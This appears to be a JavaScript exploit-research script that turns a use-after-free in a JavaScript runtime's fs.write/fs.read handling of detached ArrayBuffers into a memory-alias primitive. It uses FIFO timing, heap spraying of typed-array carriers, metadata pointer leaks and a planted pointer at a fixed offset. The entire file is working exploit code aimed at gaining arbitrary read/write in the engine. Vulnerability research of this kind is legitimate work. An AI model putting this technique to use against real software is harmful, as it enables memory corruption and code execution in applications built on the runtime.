// No-FFI follow-up for the 128-byte ArrayBuffer/view metadata reclaim class.
//
// The 96/128 triage showed that UAF_SIZE=128, WRITE_OFFSET=16 makes JSC
// dereference the exact qword planted there for ArrayBuffer/view carriers. This
// probe checks whether that crash-only deref can be upgraded into a retained
// JS-visible alias by:
//
//   1. leaking pointer-like words from one sprayed ArrayBuffer/view metadata
//      allocation through the fs.write stale-read side,
//   2. writing a selected leaked pointer into offset 16 of another sprayed
//      ArrayBuffer/view metadata allocation through fs.read,
//   3. constructing fresh Uint8Array views from the corrupted target buffers,
//      then checking whether reads/writes alias the original source views.
//
// It intentionally uses only local JS APIs, node:fs FIFOs, and ArrayBuffer
// detach. There is no bun:ffi, no native helper dylib, and no symbol lookup.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const leakAttempts = Number(process.env.LEAK_ATTEMPTS || 12);
const writeAttempts = Number(process.env.WRITE_ATTEMPTS || 8);
const leakOffsets = parseNumberList(process.env.LEAK_OFFSETS || "16");
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const deltas = parseBigIntList(process.env.DELTAS || "0");
const sourceFillBase = Number(process.env.SOURCE_FILL_BASE || 0x31);
const targetFillBase = Number(process.env.TARGET_FILL_BASE || 0x71);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x5a) & 0xff;
const sourceKind = process.env.SOURCE_KIND || "u8";
const targetKind = process.env.TARGET_KIND || "u8";
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const maxScan = Number(process.env.MAX_SCAN || sprayCount);
const stopOnAlias = process.env.STOP_ON_ALIAS !== "0";

if (writeOffset < 0 || writeOffset + 8 > uafSize) {
  throw new Error("WRITE_OFFSET must leave room for one qword inside UAF_SIZE");
}

const sourceCarriers = [];
const targetCarriers = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function parseNumberList(input) {
  return input.split(",").filter(Boolean).map(value => Number(value.trim()));
}

function parseBigIntList(input) {
  return input.split(",").filter(Boolean).map(value => BigInt(value.trim()));
}

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-ab-fresh-alias-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(error) {
  return error?.code === "EAGAIN" || error?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const written = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (written === 0) break;
      filled += written;
    } catch (error) {
      if (isAgain(error)) break;
      throw error;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (error) {
      if (!isAgain(error)) throw error;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function writeU64LE(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n &&
    value <= 0x00007ffffffffffen &&
    (value & 0x7n) === 0n;
}

function fillBytes(view, fill) {
  for (let i = 0; i < view.byteLength; i++) view[i] = fill;
}

function makeCarrier(kind, index, fillBase) {
  const fill = (fillBase + (index & 15)) & 0xff;
  switch (kind) {
    case "arraybuffer": {
      const ab = new ArrayBuffer(viewSize);
      fillBytes(new Uint8Array(ab), fill);
      return ab;
    }
    case "u8": {
      const view = new Uint8Array(new ArrayBuffer(viewSize));
      view.fill(fill);
      return view;
    }
    case "u8-offset": {
      const ab = new ArrayBuffer(viewSize + 16);
      const view = new Uint8Array(ab, 16, viewSize);
      view.fill(fill);
      return view;
    }
    case "dataview": {
      const ab = new ArrayBuffer(viewSize);
      const bytes = new Uint8Array(ab);
      bytes.fill(fill);
      return new DataView(ab);
    }
    default:
      throw new Error("carrier kind must be arraybuffer, u8, u8-offset, or dataview");
  }
}

function carrierBuffer(carrier) {
  return carrier instanceof ArrayBuffer ? carrier : carrier.buffer;
}

function carrierBytes(carrier) {
  if (carrier instanceof ArrayBuffer) return new Uint8Array(carrier);
  if (carrier instanceof DataView) return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
  return new Uint8Array(carrier.buffer, carrier.byteOffset, carrier.byteLength);
}

function freshBytes(carrier) {
  return new Uint8Array(carrierBuffer(carrier));
}

function allocateSourceCarriers() {
  sourceCarriers.length = 0;
  for (let i = 0; i < sprayCount; i++) sourceCarriers.push(makeCarrier(sourceKind, i, sourceFillBase));
}

function allocateTargetCarriers() {
  targetCarriers.length = 0;
  for (let i = 0; i < sprayCount; i++) targetCarriers.push(makeCarrier(targetKind, i, targetFillBase));
}

async function leakMetadata() {
  const fifo = makeFifo("leak");
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(uafSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    allocateSourceCarriers();
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, uafSize, "metadata");
    const result = await done;
    const words = [];
    for (let offset = 0; offset + 8 <= Math.min(uafSize, 128); offset += 8) {
      const value = readU64LE(leaked, offset);
      words.push({ offset, value, pointerLike: isPointerLike(value) });
    }
    return {
      bytesWritten: result.bytesWritten,
      err: result.err?.message,
      prefix: [...leaked.subarray(0, Math.min(96, leaked.length))],
      words,
    };
  } finally {
    closeFifo(fifo);
  }
}

async function findLeak() {
  const attempts = [];
  for (let attempt = 1; attempt <= leakAttempts; attempt++) {
    const leak = await leakMetadata();
    const candidates = [];
    for (const offset of leakOffsets) {
      const word = leak.words.find(entry => entry.offset === offset);
      if (word && isPointerLike(word.value)) candidates.push({ offset, value: word.value });
    }

    attempts.push({
      attempt,
      prefix16: leak.prefix.slice(0, 16),
      selected: candidates.map(candidate => ({ offset: candidate.offset, value: hex(candidate.value) })),
      words: leak.words.map(word => ({ offset: word.offset, value: hex(word.value), pointerLike: word.pointerLike })),
    });

    if (candidates.length > 0) return { leak, attempts, candidates };
  }

  return { leak: null, attempts, candidates: [] };
}

function scanSourceForWrite(value, limit = 8) {
  const hits = [];
  for (let i = 0; i < sourceCarriers.length; i++) {
    try {
      const bytes = carrierBytes(sourceCarriers[i]);
      if (bytes[0] === value) {
        hits.push({ sourceIndex: i, byteOffset: 0, value });
        if (hits.length >= limit) break;
      }
    } catch (error) {
      hits.push({ sourceIndex: i, error: error?.message || String(error) });
      if (hits.length >= limit) break;
    }
  }
  return hits;
}

function summarizeFreshAlias(index) {
  const carrier = targetCarriers[index];
  const expectedTarget = (targetFillBase + (index & 15)) & 0xff;
  const out = { targetIndex: index, expectedTarget };
  try {
    const existing = carrierBytes(carrier);
    out.existingLength = existing.length;
    out.existingFirst = existing[0];
    out.existingLast = existing[existing.length - 1];
  } catch (error) {
    out.existingError = error?.message || String(error);
  }

  try {
    const fresh = freshBytes(carrier);
    out.freshLength = fresh.length;
    out.freshFirst = fresh[0];
    out.freshLast = fresh[fresh.length - 1];
    if (out.freshFirst !== expectedTarget || out.freshLast !== expectedTarget) {
      const before = out.freshFirst;
      fresh[0] = aliasWrite;
      out.freshFirstBeforeWrite = before;
      out.freshFirstAfterWrite = fresh[0];
      out.sourceHitsAfterWrite = scanSourceForWrite(aliasWrite);
    }
  } catch (error) {
    out.freshError = error?.message || String(error);
  }

  const interesting =
    out.existingError !== undefined ||
    out.freshError !== undefined ||
    out.freshFirst !== expectedTarget ||
    out.freshLast !== expectedTarget ||
    (out.sourceHitsAfterWrite && out.sourceHitsAfterWrite.length > 0);

  return interesting ? out : null;
}

function scanFreshAliases() {
  const findings = [];
  const limit = Math.min(maxScan, targetCarriers.length);
  for (let i = 0; i < limit; i++) {
    const summary = summarizeFreshAlias(i);
    if (!summary) continue;
    findings.push(summary);
    if (summary.sourceHitsAfterWrite?.length > 0 && stopOnAlias) break;
    if (findings.length >= 16) break;
  }
  return findings;
}

async function writePointer(pointer) {
  const path = join(tmpdir(), `bun-ab-fresh-alias-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);

  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);

    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });

    detach(ab);
    gcNow();
    allocateTargetCarriers();
    gcNow();

    fs.writeSync(fd, writeU64LE(pointer), 0, 8);
    const result = await done;
    const freshFindings = scanFreshAliases();
    return {
      bytesRead: result.bytesRead,
      err: result.err?.message,
      freshFindings,
      aliasCount: freshFindings.reduce((count, finding) => count + (finding.sourceHitsAfterWrite?.length || 0), 0),
    };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

const { leak, attempts, candidates } = await findLeak();
if (!leak) {
  console.log(JSON.stringify({
    final: true,
    result: "no-leak-candidate",
    uafSize,
    viewSize,
    sprayCount,
    sourceKind,
    targetKind,
    leakOffsets,
    writeOffset,
    attempts,
  }, null, 2));
  process.exit(1);
}

console.log(JSON.stringify({
  phase: "leak",
  uafSize,
  viewSize,
  sprayCount,
  sourceKind,
  targetKind,
  leakOffsets,
  writeOffset,
  deltas: deltas.map(delta => hex(delta)),
  attempts,
  candidates: candidates.map(candidate => ({ offset: candidate.offset, value: hex(candidate.value) })),
}, null, 2));

const writes = [];
let aliasCount = 0;
outer:
for (const candidate of candidates) {
  for (const delta of deltas) {
    const pointer = candidate.value + delta;
    for (let attempt = 1; attempt <= writeAttempts; attempt++) {
      const result = await writePointer(pointer);
      const entry = {
        attempt,
        leakOffset: candidate.offset,
        leakedPointer: hex(candidate.value),
        delta: hex(delta),
        pointer: hex(pointer),
        ...result,
      };
      writes.push(entry);
      aliasCount += result.aliasCount;
      console.log(JSON.stringify({ phase: "write", ...entry }, null, 2));
      if (aliasCount > 0 && stopOnAlias) break outer;
    }
  }
}

console.log(JSON.stringify({
  final: true,
  result: aliasCount > 0 ? "alias-confirmed" : "no-alias",
  uafSize,
  viewSize,
  sprayCount,
  sourceKind,
  targetKind,
  leakOffsets,
  writeOffset,
  candidates: candidates.map(candidate => ({ offset: candidate.offset, value: hex(candidate.value) })),
  writes,
  aliasCount,
}, null, 2));

process.exitCode = aliasCount > 0 ? 86 : 1;
